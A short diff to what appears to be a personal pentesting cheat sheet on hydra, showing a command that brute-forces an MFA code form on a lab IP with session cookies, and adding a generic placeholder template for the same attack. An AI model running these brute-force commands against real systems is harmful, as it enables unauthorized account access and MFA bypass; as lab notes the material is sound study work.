@@ -13,4 +13,8 @@ With cookie:
 ```
 hydra -l jason -P list.txt 10.10.204.240 http-post-form "/console/mfa.php:code=^PASS^:H=Cookie: PHPSESSID=l6jjj91qbp4867sesgnso2ti78; user=jason_test_account; pwd=abkr:Incorrect" -I -V
 ```
+
+```
+hydra -l username -P list.txt IP_ADDR http-post-form "/PATH/VULN.PHP:PASSWORD_ARG=^PASS^:H=Cookie: COOKIE1=TESTl; COOKIE2=TEST2:INCORRECT_RET_VALUE" -I -V
+```
 Note: the "incorrect" must always be the last parameter
